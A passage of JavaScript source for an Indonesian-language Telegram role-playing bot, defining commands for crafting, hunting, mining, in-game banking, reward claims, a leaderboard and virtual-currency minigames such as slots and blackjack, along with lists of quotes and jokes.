    const itemName = match[1].toLowerCase();
    const amount = match[2] ? parseInt(match[2]) : 1;
    const user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus daftar dulu pakai /register.");

    if (itemName === "all") {
        // Craft semua item yang bisa di-craft
        let craftedItems = [];
        for (let craftItem in craftingRecipes) {
            const recipe = craftingRecipes[craftItem];
            let canCraft = true;

            // Cek bahan cukup atau enggak
            for (let resource in recipe) {
                if (!user.inventory[resource] || user.inventory[resource].quantity < recipe[resource] * amount) {
                    canCraft = false;
                    break;
                }
            }

            if (canCraft) {
                // Kurangi bahan & tambah item baru
                for (let resource in recipe) {
                    user.inventory[resource].quantity -= recipe[resource] * amount;
                    if (user.inventory[resource].quantity <= 0) delete user.inventory[resource];
                }

                user.inventory[craftItem] = user.inventory[craftItem] || { name: craftItem, quantity: 0 };
                user.inventory[craftItem].quantity += amount;
                craftedItems.push(`${amount}x ${craftItem}`);
            }
        }

        if (craftedItems.length > 0) {
            saveUsers();
            bot.sendMessage(msg.chat.id, `✅ Kamu berhasil membuat: ${craftedItems.join(", ")}!`);
        } else {
            bot.sendMessage(msg.chat.id, "⚠️️ Tidak cukup bahan untuk membuat item.");
        }
    } else {
        if (!craftingRecipes[itemName]) return bot.sendMessage(msg.chat.id, "⚠️️ Item ini tidak bisa di-craft.");
        if (amount < 1) return bot.sendMessage(msg.chat.id, "⚠️️ Jumlah harus minimal 1.");

        const recipe = craftingRecipes[itemName];

        // Cek bahan cukup atau enggak
        for (let resource in recipe) {
            if (!user.inventory[resource] || user.inventory[resource].quantity < recipe[resource] * amount) {
                return bot.sendMessage(msg.chat.id, `⚠️️ Kamu butuh lebih banyak ${resource}.`);
            }
        }

        // Kurangi bahan & tambah item baru
        for (let resource in recipe) {
            user.inventory[resource].quantity -= recipe[resource] * amount;
            if (user.inventory[resource].quantity <= 0) delete user.inventory[resource];
        }

        user.inventory[itemName] = user.inventory[itemName] || { name: itemName, quantity: 0 };
        user.inventory[itemName].quantity += amount;

        saveUsers();
        bot.sendMessage(msg.chat.id, `✅ Kamu berhasil membuat ${amount}x ${itemName}!`);
    }

    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah shop (Lihat Daftar Item)
bot.onText(/\/shop/, (msg) => {
    if (Object.keys(items).length === 0) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Toko sedang kosong. Coba lagi nanti!");
    }

    let shopMessage = "🛍 Toko - List Item 🛍\n\n";

    const categories = {};

    // Grouping items by category
    for (const category in items) {
        for (const item in items[category]) {
            const itemData = items[category][item];
            if (!categories[category]) categories[category] = [];
            categories[category].push(`🔹 ${itemData.name} - 💰 ${itemData.price}`);
        }
    }

    // Format message per kategori
    for (const category in categories) {
        shopMessage += `📌 ${category}\n`;
        shopMessage += categories[category].join("\n") + "\n\n";
    }

    bot.sendMessage(msg.chat.id, shopMessage, { parse_mode: "Markdown" });
    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Berburu
bot.onText(/\/berburu/, (msg) => {
    const userId = msg.from.id;
    let user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");

    // Daftar item berburu dengan rarity
    const huntResults = [
        { item: "steak", chance: 35 },       // 35% Daging Panggang
        { item: "fish", chance: 25 },        // 25% Ikan
        { item: "wool", chance: 15 },        // 15% Wool
        { item: "bone", chance: 10 },        // 10% Tulang
        { item: "golden_apple", chance: 5 }, // 5% Apel Emas
        { item: "dragon_meat", chance: 2 },  // 2% Daging Naga
        { item: "phoenix_feather", chance: 1 } // 1% Bulu Phoenix
    ];

    // Menentukan item berburu berdasarkan probabilitas
    let randomPick = Math.random() * 100;
    let chosenItem;
    for (let loot of huntResults) {
        if (randomPick < loot.chance) {
            chosenItem = loot.item;
            break;
        }
        randomPick -= loot.chance;
    }

    if (!chosenItem || !items[chosenItem]) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Terjadi kesalahan! Item tidak ditemukan.");
    }

    // Menentukan jumlah drop (1-3 item)
    const itemAmount = Math.floor(Math.random() * 3) + 1;

    // Tambahkan hasil berburu ke inventory
    user.inventory[chosenItem] = user.inventory[chosenItem] || { name: items[chosenItem].name, quantity: 0 };
    user.inventory[chosenItem].quantity += itemAmount;

    saveUsers(); // Simpan perubahan

    bot.sendMessage(msg.chat.id, `🏹 Kamu berhasil berburu dan mendapatkan ${itemAmount} ${items[chosenItem].name}!`);
    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Menebang Pohon
bot.onText(/\/menebang/, (msg) => {
    const userId = msg.from.id;
    let user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");

    // Pastikan user memiliki inventory
    if (!user.inventory) user.inventory = {};

    // Menghasilkan jumlah item acak
    const woodAmount = Math.floor(Math.random() * 5) + 1;  // 1-5 Kayu
    const stickAmount = Math.floor(Math.random() * 3) + 1; // 1-3 Stick
    const leafAmount = Math.floor(Math.random() * 4) + 1;  // 1-4 Leaf
    const appleChance = Math.random() < 0.3 ? 1 : 0; // 30% Drop Apple

    // Menambahkan ke inventory
    user.inventory.kayu = user.inventory.kayu || { name: "wood", quantity: 0 };
    user.inventory.kayu.quantity += woodAmount;

    user.inventory.stick = user.inventory.stick || { name: "stick", quantity: 0 };
    user.inventory.stick.quantity += stickAmount;

    user.inventory.leaf = user.inventory.leaf || { name: "leaf", quantity: 0 };
    user.inventory.leaf.quantity += leafAmount;

    if (appleChance > 0) {
        user.inventory.apple = user.inventory.apple || { name: "apple", quantity: 0 };
        user.inventory.apple.quantity += appleChance;
    }

    saveUsers(); // Simpan perubahan

    let message = `✅ Kamu berhasil menebang pohon dan mendapatkan:\n`;
    message += `🌲 ${woodAmount} Kayu\n`;
    message += `🪵 ${stickAmount} Stick\n`;
    message += `🍃 ${leafAmount} Leaf\n`;
    if (appleChance > 0) message += `🍏 ${appleChance} Apple\n`;

    bot.sendMessage(msg.chat.id, message);
    updateBotStats("command"); // Track penggunaan perintah
}); 

// 📌 Perintah Menambang
bot.onText(/\/menambang/, (msg) => {
    const userId = msg.from.id;
    let user = getUserData(userId);

    if (!user) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");
    }

    // Pastikan user memiliki inventory
    if (!user.inventory) user.inventory = {};

    // Daftar hasil tambang dengan rarity
    const mineResults = [
        { item: "stone", chance: 25 },      // 25% Batu
        { item: "iron", chance: 20 },       // 20% Besi
        { item: "gold", chance: 15 },       // 15% Emas
        { item: "diamond", chance: 10 },    // 10% Berlian
        { item: "obsidian", chance: 8 },    // 8% Obsidian
        { item: "crystal", chance: 6 },     // 6% Kristal Ajaib
        { item: "ruby", chance: 5 },        // 5% Ruby
        { item: "sapphire", chance: 3 },    // 3% Sapphire
        { item: "emerald", chance: 2 },     // 2% Emerald
        { item: "netherite", chance: 1 }    // 1% Netherite
    ];

    // Menentukan hasil tambang berdasarkan probabilitas
    let randomPick = Math.random() * 100;
    let chosenResource;
    for (let resource of mineResults) {
        if (randomPick < resource.chance) {
            chosenResource = resource.item;
            break;
        }
        randomPick -= resource.chance;
    }

    // Cek apakah resource terpilih valid
    if (!chosenResource || !items.MATERIAL[chosenResource] && !items.TOOLS[chosenResource] && !items.WEAPONS[chosenResource] && !items.ARMOR[chosenResource] && !items.BOWS_ARROWS[chosenResource] && !items.FOOD[chosenResource] && !items.POTIONS[chosenResource] && !items.RARE_ITEMS[chosenResource] && !items.QUEST_ITEMS[chosenResource] && !items.ILLEGAL[chosenResource]) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Terjadi kesalahan! Item tidak ditemukan.");
    }

    // Menentukan jumlah hasil tambang (1-3 item)
    const resourceAmount = Math.floor(Math.random() * 3) + 1;

    // Tambahkan hasil tambang ke inventory
    user.inventory[chosenResource] = user.inventory[chosenResource] || { name: items.MATERIAL[chosenResource]?.name || items.TOOLS[chosenResource]?.name || items.WEAPONS[chosenResource]?.name || items.ARMOR[chosenResource]?.name || items.BOWS_ARROWS[chosenResource]?.name || items.FOOD[chosenResource]?.name || items.POTIONS[chosenResource]?.name || items.RARE_ITEMS[chosenResource]?.name || items.QUEST_ITEMS[chosenResource]?.name || items.ILLEGAL[chosenResource]?.name, quantity: 0 };
    user.inventory[chosenResource].quantity += resourceAmount;

    saveUsers(); // Simpan perubahan

    bot.sendMessage(msg.chat.id, `⛏️ Kamu berhasil menambang dan mendapatkan ${resourceAmount} ${user.inventory[chosenResource].name}!`);
    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Looting (Hadiah Acak)
bot.onText(/\/loot/, (msg) => {
    const userId = msg.from.id;
    const user = getUserData(userId);

    if (!user) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");
    }

    const currentTime = Date.now();
    const lastLootTime = user.cd && user.cd.loot ? user.cd.loot : 0;
    const cooldownTime = 10 * 60 * 1000; // 10 menit dalam milidetik

    if (currentTime - lastLootTime < cooldownTime) {
        const remainingTime = Math.ceil((cooldownTime - (currentTime - lastLootTime)) / 1000); // Sisa waktu cooldown dalam detik
        return bot.sendMessage(msg.chat.id, `⚠️️ Kamu harus menunggu ${remainingTime} detik sebelum looting lagi.`);
    }

    // Update waktu terakhir looting
    user.cd = { ...user.cd, loot: currentTime };
    saveDatabase(loadDatabase()); // Simpan data setelah update cooldown

    // Panggil fungsi giveRandomItem dan kirim pesan
    const item = giveRandomItem(userId);
    saveUsers(); // Pastikan data user disimpan

    updateBotStats("command"); // Track penggunaan perintah
    bot.sendMessage(msg.chat.id, `🎉 Kamu mendapatkan loot: ${item}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/(daily|weekly|monthly)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const type = match[1];

    const users = loadDatabase();
    const user = users[userId];

    if (!user) return bot.sendMessage(chatId, "⚠️️ Kamu belum terdaftar! Ketik /register untuk daftar.");

    const now = Date.now();
    const cooldowns = {
        daily: 24 * 60 * 60 * 1000,
        weekly: 7 * 24 * 60 * 60 * 1000,
        monthly: 30 * 24 * 60 * 60 * 1000
    };

    if (!user.lastClaim) user.lastClaim = { daily: 0, weekly: 0, monthly: 0 };

    if (now - user.lastClaim[type] < cooldowns[type]) {
        const remaining = cooldowns[type] - (now - user.lastClaim[type]);
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        return bot.sendMessage(chatId, `⏳ Kamu sudah klaim ${type}! Tunggu ${hours} jam ${minutes} menit lagi.`);
    }

    // Reward berdasarkan jenis klaim
    const rewards = {
        daily: { balance: 200, xp: 10, kayu: 5, iron: 1, gold: 1 },
        weekly: { balance: 1500, xp: 50, kayu: 20, iron: 5, gold: 3, diamond: Math.random() < 0.3 ? 1 : 0 },
        monthly: { balance: 6000, xp: 200, kayu: 50, iron: 15, gold: 10, diamond: Math.random() < 0.5 ? 1 : 0, netherite: Math.random() < 0.1 ? 1 : 0 }
    };

    // Tambahin reward ke user
    user.balance += rewards[type].balance;
    user.xp += rewards[type].xp;

    if (!user.inventory) user.inventory = {};

    Object.keys(rewards[type]).forEach(item => {
        if (item !== 'balance' && item !== 'xp') {
            if (!user.inventory[item]) user.inventory[item] = { name: item, quantity: 0 };
            user.inventory[item].quantity += rewards[type][item];
        }
    });

    user.lastClaim[type] = now;
    saveDatabase(users);

    let rewardItems = [];
    Object.keys(rewards[type]).forEach(item => {
        if (rewards[type][item] > 0) {
            rewardItems.push(`+${rewards[type][item]} ${item}`);
        }
    });

    bot.sendMessage(chatId, `✅ Berhasil klaim hadiah ${type}, kamu dapat:\n${rewardItems.join("\n")}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/^\/leaderboard$/, (msg) => {
    const chatId = msg.chat.id;
    const users = loadDatabase(); // Ambil semua data user

    if (Object.keys(users).length === 0) {
        return bot.sendMessage(chatId, "⚠️ Belum ada user terdaftar di leaderboard!");
    }

    // Urutin berdasarkan XP (dari terbesar ke terkecil)
    const sortedUsers = Object.entries(users).sort(([, a], [, b]) => b.xp - a.xp);

    // Format leaderboard
    let leaderboardText = "🏆 Leaderboard XP 🏆\n\n";
    sortedUsers.forEach(([userId, user], index) => {
        leaderboardText += `${index + 1}️⃣. ${user.nickname || `User_${userId}`} - ${getRankEmoji(user.rank)} ${user.rank}\n`;
    });

    bot.sendMessage(chatId, leaderboardText, { parse_mode: "Markdown" });
    updateBotStats("command"); // Track penggunaan perintah
});

// Fungsi buat kasih emoji di rank
function getRankEmoji(rank) {
    const rankEmojis = {
        "Bronze": "🥉",
        "Silver": "🥈",
        "Gold": "🥇",
        "Platinum": "🏅",
        "Admin": "⚜️",
        "Dewa": "🌟",
        "Dewa Elit": "🔥"
    };
    return rankEmojis[rank] || "🏆";
}

// Set Nickname (Cooldown 1 Hari)
bot.onText(/\/setnick (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const users = loadDatabase();
    const newNick = match[1];

    if (!users[userId]) return bot.sendMessage(msg.chat.id, "⚠️ Kamu belum terdaftar!");
    
    if (cooldowns[userId] && Date.now() - cooldowns[userId] < 86400000) {
        return bot.sendMessage(msg.chat.id, "⏳ Kamu hanya bisa mengganti nickname sekali sehari!");
    }
    
    users[userId].nickname = newNick;  // Ubah ke nickname bukan name
    cooldowns[userId] = Date.now();
    saveDatabase(users);
    bot.sendMessage(msg.chat.id, `✅ Nickname berhasil diubah menjadi ${newNick}`);
    updateBotStats("command"); // Track penggunaan perintah
});

// Deposit Balance
bot.onText(/\/deposit (\d+)/, (msg, match) => {
    const userId = msg.from.id;
    const users = loadDatabase();
    const amount = parseInt(match[1]);

    if (!users[userId]) return bot.sendMessage(msg.chat.id, "⚠️ Kamu belum terdaftar!");
    if (amount <= 0 || users[userId].balance < amount) return bot.sendMessage(msg.chat.id, "❌ Saldo tidak cukup!");
    
    users[userId].balance -= amount;
    users[userId].bank = (users[userId].bank || 0) + amount;
    saveDatabase(users);
    bot.sendMessage(msg.chat.id, `✅ Berhasil deposit ${amount} ke bank!`);
    updateBotStats("command"); // Track penggunaan perintah
});

// Cek Saldo Bank
bot.onText(/^\/cekbank$/, (msg) => {
    const userId = msg.from.id;
    const users = loadDatabase();

    if (!users[userId]) return bot.sendMessage(msg.chat.id, "⚠️ Kamu belum terdaftar! Ketik /register untuk daftar.");

    const bankBalance = users[userId].bank || 0;
    bot.sendMessage(msg.chat.id, `🏦 Saldo Bank Kamu: ${bankBalance}`);
    updateBotStats("command"); // Track penggunaan perintah
});

// Withdraw Balance
bot.onText(/\/withdraw (\d+)/, (msg, match) => {
    const userId = msg.from.id;
    const users = loadDatabase();
    const amount = parseInt(match[1]);

    if (!users[userId] || !users[userId].bank || users[userId].bank < amount) return bot.sendMessage(msg.chat.id, "❌ Saldo bank tidak cukup!");
    
    users[userId].bank -= amount;
    users[userId].balance += amount;
    saveDatabase(users);
    bot.sendMessage(msg.chat.id, `✅ Berhasil withdraw ${amount}!`);
    updateBotStats("command"); // Track penggunaan perintah
});

// HideTag
bot.onText(/\/h (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const message = match[1];
    bot.sendMessage(chatId, message, { parse_mode: "Markdown", disable_notification: true });
    updateBotStats("command"); // Track penggunaan perintah
});

const getRandomInt = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
};

function gamble(userId, amount, gameType) {
    const users = loadDatabase();
    if (!users[userId] || users[userId].balance < amount) {
        return { success: false, message: "❌ Balance tidak cukup!" };
    }
    
    // Kurangi balance dulu sebagai taruhan
    users[userId].balance -= amount;
    let win = false;
    let reward = 0;
    let message = "";

    switch (gameType) {
        case "lotre":
            // Lottery grid dengan tengkorak yang diletakkan secara acak
            const lotteryGrid = [['✅', '✅', '✅'], ['✅', '✅', '✅'], ['✅', '✅', '✅']];
            
            // Tempatkan 1 tengkorak secara acak
            const randomRow = getRandomInt(0, 2); // Pilih baris acak
            const randomCol = getRandomInt(0, 2); // Pilih kolom acak
            lotteryGrid[randomRow][randomCol] = '💀'; // Tempatkan tengkorak

            message = "Ketik /pick <Nomor> untuk memilih nomor!\n1⃣2⃣3⃣ \n4⃣5⃣6⃣ \n7⃣8⃣9⃣";
            users[userId].lotteryGrid = lotteryGrid; // Simpan grid untuk digunakan nanti
            break;

        case "slot":
            const slotSymbols = ["🍒", "🍋", "⭐", "💎"];
            let result = [
                slotSymbols[getRandomInt(0, slotSymbols.length - 1)],
                slotSymbols[getRandomInt(0, slotSymbols.length - 1)],
                slotSymbols[getRandomInt(0, slotSymbols.length - 1)]
            ];

            win = result[0] === result[1] && result[1] === result[2];
            // Periksa taruhan
            if (amount >= 50 && amount < 1000) {
                reward = win ? getRandomInt(amount * 3, amount * 5) : 0;
            } else if (amount >= 1000 && amount < 1000000) {
                reward = win ? getRandomInt(amount * 5, amount * 10) : 0;
            } else if (amount >= 1000000 && amount < 9999999999) {
                reward = win ? getRandomInt(amount * 10, amount * 30) : 0;
            } else if (amount >= 9999999999) {
                // Taruhan Unli
                reward = win ? getRandomInt(amount * 30, amount * 50) : 0;
            } else {
                reward = 0; // Taruhan kurang dari 50 atau lebih tidak valid
            }
            message = `🎰 | ${result.join(" | ")} | ${win ? "Menang!" : "Kalah!"}`;
            break;

        case "dice":
            let userRoll = getRandomInt(1, 6);
            let botRoll = getRandomInt(1, 6);
            win = userRoll > botRoll;
            reward = win ? getRandomInt(amount * 1.2, amount * 2) : 0;
            message = `🎲 Kamu: ${userRoll} | Bot: ${botRoll} | ${win ? "Menang!" : "Kalah!"}`;
            break;
        
        case "coinflip":
            win = getRandomInt(0, 1) === 1;
            reward = win ? getRandomInt(amount * 1.5, amount * 2.5) : 0;
            message = `🪙 ${win ? "Menang!" : "Kalah!"}`;
            break;

        case "blackjack":
            let userTotal = getRandomInt(15, 21);
            let botTotal = getRandomInt(16, 22);
            win = userTotal <= 21 && (botTotal > 21 || userTotal > botTotal);
            reward = win ? getRandomInt(amount * 2, amount * 3) : 0;
            message = `🃏 Kamu: ${userTotal} | Bot: ${botTotal} | ${win ? "Menang!" : "Kalah!"}`;
            break;

        case "roulette":
            let colors = ["🔴", "⚫"];
            let chosenColor = colors[getRandomInt(0, 1)];
            win = getRandomInt(0, 1) === 1;
            reward = win ? getRandomInt(amount * 2, amount * 4) : 0;
            message = `🎡 Warna: ${chosenColor} | ${win ? "Menang!" : "Kalah!"}`;
            break;
        
        default:
            return { success: false, message: "❌ Game tidak ditemukan!" };
    }

    // Update balance atau kasih item jika menang
    if (win) {
        if (Math.random() < 0.3) { // 30% chance dapet item
            const items = ["Kayu", "Stick", "Stone", "Iron", "Diamond"];
            let itemName = items[getRandomInt(0, items.length - 1)];
            let itemQty = itemName === "Diamond" ? getRandomInt(1, 5) : getRandomInt(10, 30);
            
            if (!users[userId].inventory[itemName]) {
                users[userId].inventory[itemName] = { name: itemName, quantity: 0 };
            }
            users[userId].inventory[itemName].quantity += itemQty;
            message += `\n🎁 Kamu mendapatkan item: ${itemName} x${itemQty}`;
        } else { // 70% chance dapet balance
            users[userId].balance += reward;
            message += `\n💰 Kamu mendapatkan: ${reward}`;
        }
        updateBotStats("gamblingWins"); // Track kemenangan
    }
    
    if (!win) {
        updateBotStats("gamblingLose"); // Track kekalahan
    }

    saveDatabase(users);
    return { success: true, message };
}

// Command /lotre
bot.onText(/\/lotre (\d+)/, (msg, match) => {
    if (!match || match.length < 2) {
        return bot.sendMessage(msg.chat.id, "Gunakan /lotre <jumlah> Untuk Membeli Lotre\n1 Lotre = 50 Balance.");
    }
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    
    const result = gamble(chatId, amount, "lotre");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

// Command /pick
bot.onText(/\/pick (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const pick = parseInt(match[1]);
    
    const users = loadDatabase();
    const user = users[userId];
    
    if (!user) {
        return bot.sendMessage(chatId, "⚠️ Kamu belum registrasi. Ketik /register terlebih dahulu.");
    }
    
    if (!user.lotteryGrid) {
        return bot.sendMessage(chatId, "❌ Kamu belum bermain lotre. Ketik /lotre <Jumlah> untuk membeli tiket.");
    }

    const lotteryGrid = user.lotteryGrid;
    const row = Math.floor((pick - 1) / 3);
    const col = (pick - 1) % 3;

    let message = "";
    if (lotteryGrid[row][col] === '💀') {
        // User kalah
        user.balance -= 50;  // Deduct ticket cost
        const message = `💀 Kamu memilih nomor ${pick}. Kamu kalah! Balance berkurang 50.`;
        updateBotStats("gamblingLose"); // Track kalah
    } else {
        // User menang
        const item = giveRandomItem(userId); // Dapatkan item random
        const message = `✅ Kamu memilih nomor ${pick}. Kamu menang! Kamu mendapatkan item: ${item}`;
        updateBotStats("gamblingWins"); // Track menang
    }

    // Hapus grid setelah permainan selesai
    delete user.lotteryGrid;
    saveDatabase(users);

    bot.sendMessage(chatId, message);
});

// Command /slot
bot.onText(/\/slot (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    const result = gamble(chatId, amount, "slot");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

// Command /dice
bot.onText(/\/dice (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    const result = gamble(chatId, amount, "dice");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

// Command /coinflip
bot.onText(/\/coinflip (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    const result = gamble(chatId, amount, "coinflip");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

// Command /blackjack
bot.onText(/\/blackjack (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    const result = gamble(chatId, amount, "blackjack");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

// Command /roulette
bot.onText(/\/roulette (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const amount = parseInt(match[1]);
    const result = gamble(chatId, amount, "roulette");
    bot.sendMessage(chatId, result.message);
    updateBotStats("command");
});

bot.onText(/^\/stats$/, async (msg) => {
    const chatId = msg.chat.id;

    // Ambil data statistik bot
    const botData = getBotStats(); // Fungsi buat ambil total stats bot

    let message = `📊 Statistik Bot\n` +
                  `🤖 Bot Name: ${global.botname}\n` +
                  `📌 Total Command Dipakai: ${botData.totalCommands}\n` +
                  `📊 Rata-rata Command / User: ${botData.avgCommandsPerUser}\n` +
                  `🎰 Total Menang Gambling: ${botData.totalGamblingWins}\n` +
                  `💀 Total Kalah Gambling: ${botData.totalGamblingLoses}\n`;

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
    updateBotStats("command"); // Track penggunaan perintah
});

// Command /customrank
bot.onText(/\/customrank (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const rankInput = match[1].trim();  // Rank yang ingin diubah
    const users = loadDatabase();

    if (!users[userId]) {
        return bot.sendMessage(msg.chat.id, "⚠️ Kamu belum terdaftar!");
    }

    const user = users[userId];

    // Cek apakah XP sudah mencapai 999999
    if (user.xp < 999999) {
        return bot.sendMessage(msg.chat.id, "⚠️ Kamu harus mencapai XP 999999 untuk bisa mengganti rank!");
    }

    // Ubah rank
    user.rank = rankInput;
    saveDatabase(users);

    bot.sendMessage(msg.chat.id, `✅ Rank kamu telah berhasil diubah menjadi ${rankInput}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/quote (\w+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const language = match[1].toLowerCase();
    
    let quotes = {
        "id": [
            "“Kehidupan adalah 10% apa yang terjadi padamu dan 90% bagaimana kamu meresponsnya.” - Charles R. Swindoll",
            "“Hidup bukanlah tentang menunggu badai berlalu, tapi tentang belajar menari di tengah hujan.” - Unknown",
            "“Jangan menunggu untuk mencapai tujuan besar, nikmatilah perjalanan kecil.” - Unknown",
            "“Kehidupan adalah pilihan, jadi pilihlah untuk bahagia.” - Unknown",
            "“Hidup adalah 1% kejadian dan 99% bagaimana kita menanggapinya.” - Charles R. Swindoll",
            "“Mimpi itu penting, tapi lebih penting lagi adalah tindakan untuk mewujudkannya.” - Unknown",
            "“Hidup adalah tentang menjalani momen-momen kecil yang penuh makna.” - Unknown",
            "“Tidak ada yang bisa menghalangi seseorang yang bertekad mencapai tujuannya.” - Unknown",
            "“Setiap langkah kecil membawa kita lebih dekat kepada tujuan besar.” - Unknown",
            "“Hidup bukan tentang berapa lama kita hidup, tetapi bagaimana kita hidup.” - Unknown",
            "“Jangan pernah menyerah, karena hal-hal terbaik datang pada waktu yang tak terduga.” - Unknown",
            "“Keberhasilan bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci keberhasilan.” - Albert Schweitzer",
            "“Bertumbuh itu menyakitkan, tapi tetaplah tumbuh.” - Unknown",
            "“Percayalah pada dirimu sendiri dan segala yang mungkin terjadi.” - Unknown",
            "“Kegagalan hanya sukses yang tertunda.” - Unknown",
            "“Tantangan adalah kesempatan untuk belajar dan tumbuh.” - Unknown",
            "“Jika kita tidak bisa mewujudkan impian kita, impian itu akan mewujudkan kita.” - Unknown",
            "“Mengejar impian membutuhkan keberanian, tetapi juga dibutuhkan ketekunan.” - Unknown",
            "“Satu-satunya batasan yang ada adalah yang kita buat untuk diri kita sendiri.” - Unknown",
            "“Hidup bukanlah tentang menunggu badai berlalu, tetapi tentang belajar menari dalam hujan.” - Unknown",
            "“Kesuksesan bukan milik orang yang tidak pernah gagal, tetapi milik orang yang tidak pernah menyerah.” - Unknown",
            "“Kehidupan adalah seni menggambar tanpa penghapus.” - Unknown",
            "“Hidup adalah proses, bukan tujuan.” - Unknown",
            "“Tantangan adalah bahan bakar untuk sukses.” - Unknown",
            "“Pikiran positif adalah langkah pertama menuju kehidupan yang lebih baik.” - Unknown",
            "“Jika kamu tidak pergi setelah sesuatu, kamu tidak akan pernah mendapatkannya.” - Unknown",
            "“Cinta adalah kebebasan, dan kebebasan adalah keberanian.” - Unknown",
            "“Jangan takut menjadi berbeda.” - Unknown",
            "“Setiap hari adalah kesempatan baru untuk menjadi lebih baik.” - Unknown",
            "“Bahkan langkah kecil pun membawa perubahan besar.” - Unknown"
        ],
        "en": [
            "“Life is 10% what happens to us and 90% how we react to it.” - Charles R. Swindoll",
            "“Life is not about waiting for the storm to pass, but about learning to dance in the rain.” - Unknown",
            "“Don't wait to achieve big goals, enjoy the little journey.” - Unknown",
            "“Life is a choice, so choose to be happy.” - Unknown",
            "“Life is 1% what happens and 99% how we react to it.” - Charles R. Swindoll",
            "“Dreams are important, but the actions to make them come true are even more important.” - Unknown",
            "“Life is about living little meaningful moments.” - Unknown",
            "“Nothing can stop someone determined to reach their goal.” - Unknown",
            "“Every little step brings us closer to a big goal.” - Unknown",
            "“Life is not about how long we live, but how we live it.” - Unknown",
            "“Never give up, because the best things come unexpectedly.” - Unknown",
            "“Success is not the key to happiness. Happiness is the key to success.” - Albert Schweitzer",
            "“Growing pains are real, but keep growing.” - Unknown",
            "“Believe in yourself and anything is possible.” - Unknown",
            "“Failure is just success delayed.” - Unknown",
            "“Challenges are opportunities to learn and grow.” - Unknown",
            "“If we can't achieve our dreams, those dreams will achieve us.” - Unknown",
            "“Chasing dreams requires courage, but persistence is needed too.” - Unknown",
            "“The only limits we have are the ones we set for ourselves.” - Unknown",
            "“Life is not about waiting for the storm to pass, it's about dancing in the rain.” - Unknown",
            "“Success belongs to those who don’t give up.” - Unknown",
            "“Life is the art of drawing without an eraser.” - Unknown",
            "“Life is a journey, not a destination.” - Unknown",
            "“Challenges are the fuel for success.” - Unknown",
            "“A positive mindset is the first step towards a better life.” - Unknown",
            "“If you don’t go for something, you’ll never get it.” - Unknown",
            "“Love is freedom, and freedom is courage.” - Unknown",
            "“Don't be afraid to be different.” - Unknown",
            "“Every day is a new opportunity to be better.” - Unknown",
            "“Even small steps lead to big changes.” - Unknown"
        ]
    };

    let selectedQuote = "Sorry, I don't have quotes in that language!";
    if (quotes[language]) {
        selectedQuote = quotes[language][Math.floor(Math.random() * quotes[language].length)];
    }
    
    bot.sendMessage(chatId, selectedQuote);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/joke/, async (msg) => {
    const chatId = msg.chat.id;

    const jokes = [
        "Why don't skeletons fight each other? They don't have the guts.",
        "I told my computer I needed a break, now it won't stop sending me Kit-Kats.",
        "Why don’t oysters donate to charity? Because they’re shellfish!",
        "I asked the librarian if the library had any books on paranoia. She whispered, 'They're right behind you.'",
        "Why did the scarecrow win an award? Because he was outstanding in his field.",
        "Why don’t scientists trust atoms? Because they make up everything.",
        "I’m reading a book on anti-gravity. It’s impossible to put down!",
        "Why did the tomato turn red? Because it saw the salad dressing!",
        "What do you call fake spaghetti? An impasta.",
        "Why do cows wear bells? Because their horns don’t work.",
        "I used to play piano by ear, but now I use my hands.",
        "Why don’t skeletons ever use cell phones? They can’t find their bones!",
        "I couldn't figure out how to put my seatbelt on. But then it clicked.",
        "What did the ocean say to the beach? Nothing, it just waved.",
        "I can't trust stairs because they're always up to something.",
        "I know a lot of jokes about retired people, but none of them work.",
        "What do you get when you cross a snowman and a vampire? Frostbite.",
        "Why did the golfer bring two pairs of pants? In case he got a hole in one.",
        "I have a fear of speed bumps, but I am slowly getting over it.",
        "How does a penguin build its house? Igloos it together.",
        "I have a fear of elevators, so I am taking steps to avoid them.",
